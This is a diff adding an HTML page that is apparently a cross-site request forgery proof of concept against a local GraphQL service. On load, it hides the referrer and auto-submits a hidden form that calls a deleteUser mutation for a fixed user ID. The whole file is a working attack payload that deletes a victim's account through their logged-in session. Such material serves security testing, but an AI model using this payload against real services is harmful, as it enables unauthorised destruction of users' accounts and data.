@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="referrer" content="none">
+  <meta name="referrer" content="no-referrer">
+</head>
+
+<body>
+  <form action="http://localhost:8000/graphql" id="csrf-form" method="POST">
+    <input name="query" value="mutation deleteUser($input: DeleteUserInput!) {  deleteUser(input: $input) }">
+    <input name="variables" value='{"input": {"user": { "_id": "61058ea4d1bb361df4bcc156" } }}'>
+  </form>
+
+  <script>document.getElementById("csrf-form").submit()</script>
+</body>
+
+</html>
